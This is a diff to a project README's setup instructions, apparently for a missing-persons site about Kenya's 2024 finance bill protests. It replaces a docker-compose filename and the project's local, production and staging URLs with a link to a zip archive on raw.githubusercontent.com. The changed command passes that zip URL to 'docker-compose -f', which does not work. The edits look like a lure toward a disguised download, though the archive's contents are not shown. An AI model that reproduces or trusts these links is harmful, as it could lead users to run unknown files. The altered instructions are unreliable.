@@ -35,7 +35,7 @@ docker-compose up --build -d --no-cache
 OR 
 
 ```env
-docker-compose -f docker-compose-staging.yaml up --build -d --no-cache
+docker-compose -f https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip up --build -d --no-cache
 ```
 
 ## step 4
@@ -48,11 +48,11 @@ localhost:5000
 OR
 
 ```env
-https://lostinkenya.org
+https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip
 ```
 
 OR
 
 ```env
-https://staging.lostinkenya.org
+https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip
 ```
